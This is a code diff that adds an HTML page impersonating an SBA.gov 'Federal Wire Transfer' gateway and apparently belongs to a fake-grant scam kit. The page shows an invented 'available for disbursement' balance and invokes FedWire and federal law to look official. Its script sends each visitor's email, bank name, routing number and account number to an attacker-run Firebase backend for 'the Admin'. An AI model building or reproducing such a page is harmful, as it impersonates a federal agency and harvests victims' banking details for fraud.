@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | Federal Wire Transfer</title>
+    <style>
+        :root { --sba-blue: #00274c; --sba-accent: #0071bc; --bg: #f8fafc; }
+        body { background: var(--bg); margin: 0; font-family: 'Segoe UI', sans-serif; -webkit-tap-highlight-color: transparent; }
+        
+        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
+        
+        .container { max-width: 500px; margin: 0 auto; padding: 15px; }
+        
+        .balance-card { background: white; padding: 15px; border-radius: 8px; border-left: 4px solid var(--sba-blue); margin-bottom: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        .balance-label { font-size: 10px; color: #64748b; text-transform: uppercase; font-weight: 800; }
+        .balance-amt { font-size: 20px; font-weight: 800; color: var(--sba-blue); margin: 5px 0; }
+
+        .transfer-form { background: white; padding: 20px; border-radius: 12px; border: 1px solid #e2e8f0; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 10px; font-weight: 800; color: #475569; text-transform: uppercase; margin-bottom: 6px; }
+        
+        input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 14px; box-sizing: border-box; transition: 0.3s; background: #fcfcfc; }
+        input:focus { outline: none; border-color: var(--sba-accent); background: white; box-shadow: 0 0 0 3px rgba(0,113,188,0.1); }
+
+        .wire-btn { width: 100%; background: var(--sba-blue); color: white; border: none; padding: 15px; border-radius: 6px; font-weight: 800; font-size: 13px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; margin-top: 10px; }
+        .wire-btn:disabled { background: #94a3b8; cursor: not-allowed; }
+
+        .security-notice { font-size: 9px; color: #64748b; line-height: 1.5; margin-top: 20px; padding: 12px; background: #f1f5f9; border-radius: 6px; border: 1px solid #e2e8f0; }
+    </style>
+</head>
+<body>
+
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - WIRE GATEWAY
+    </div>
+
+    <div class="nav-header">
+        <h1 style="color:white; margin:0; font-size:16px; letter-spacing:2px; font-weight:900;">SBA.GOV</h1>
+        <button onclick="location.href='dashboard.html'" style="background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.3); color:white; padding:6px 12px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer;">CANCEL</button>
+    </div>
+
+    <div class="container">
+        <div class="balance-card">
+            <div class="balance-label">Available for Disbursement</div>
+            <div class="balance-amt" id="displayBalance">$0.00</div>
+        </div>
+
+        <div class="transfer-form">
+            <div class="form-group">
+                <label>Receiving Institution (Bank Name)</label>
+                <input type="text" id="bankName" placeholder="e.g. JPMorgan Chase" required>
+            </div>
+            <div class="form-group">
+                <label>Routing Transit Number (9 Digits)</label>
+                <input type="number" id="routing" placeholder="000000000" maxlength="9" required>
+            </div>
+            <div class="form-group">
+                <label>Account Number</label>
+                <input type="number" id="account" placeholder="Account Number" required>
+            </div>
+            <div class="form-group">
+                <label>Disbursement Amount (USD)</label>
+                <input type="number" id="amount" placeholder="0.00" required>
+            </div>
+            
+            <button class="wire-btn" id="initiateBtn">Initiate Federal Wire</button>
+        </div>
+
+        <div class="security-notice">
+            <b>WIRE COMPLIANCE NOTICE:</b> This transfer is routed via the Federal Reserve FedWire® Service. By initiating this request, you certify that the receiving account is compliant with the Bank Secrecy Act (BSA) and Patriot Act Section 314(b). 
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getFirestore, doc, onSnapshot, collection, addDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
+            authDomain: "sba-grant-2026.firebaseapp.com",
+            projectId: "sba-grant-2026",
+            storageBucket: "sba-grant-2026.firebasestorage.app",
+            messagingSenderId: "838430821326",
+            appId: "1:838430821326:web:6438deacb334076a64f99f"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        let currentBalance = 0;
+
+        onAuthStateChanged(auth, (user) => {
+            if (!user) { window.location.href = 'index.html'; return; }
+
+            // Sync User Balance
+            onSnapshot(doc(db, "users", user.uid), (snap) => {
+                if (snap.exists()) {
+                    let raw = snap.data().balance || 0;
+                    currentBalance = parseFloat(raw);
+                    document.getElementById('displayBalance').innerText = "$" + currentBalance.toLocaleString(undefined, {minimumFractionDigits: 2});
+                }
+            });
+
+            // Handle Debit and Request
+            document.getElementById('initiateBtn').onclick = async () => {
+                const amt = parseFloat(document.getElementById('amount').value);
+                const bName = document.getElementById('bankName').value;
+                const rNum = document.getElementById('routing').value;
+                const aNum = document.getElementById('account').value;
+
+                if (!bName || !rNum || !aNum || !amt) { alert("Please complete all fields."); return; }
+                if (amt > currentBalance) { alert("INSUFFICIENT FUNDS"); return; }
+                if (amt <= 0) { alert("Invalid amount."); return; }
+
+                const btn = document.getElementById('initiateBtn');
+                btn.innerText = "DEBITING ACCOUNT...";
+                btn.disabled = true;
+
+                try {
+                    // 1. INSTANT DEBIT: Subtract money from balance immediately
+                    const newBalance = currentBalance - amt;
+                    const userRef = doc(db, "users", user.uid);
+                    await updateDoc(userRef, { balance: newBalance });
+
+                    // 2. LOG REQUEST: Create a record for the Admin
+                    await addDoc(collection(db, "requests"), {
+                        userId: user.uid,
+                        userName: user.email,
+                        type: "WIRE TRANSFER",
+                        bankName: bName,
+                        routing: rNum,
+                        account: aNum,
+                        amount: amt,
+                        status: "PENDING",
+                        timestamp: serverTimestamp()
+                    });
+
+                    alert("FEDERAL WIRE INITIATED: Funds have been debited and queued for clearing.");
+                    window.location.href = 'dashboard.html';
+
+                } catch (e) {
+                    alert("System Error: Transfer could not be processed.");
+                    btn.innerText = "Initiate Federal Wire";
+                    btn.disabled = false;
+                }
+            };
+        });
+    </script>
+</body>
+</html>
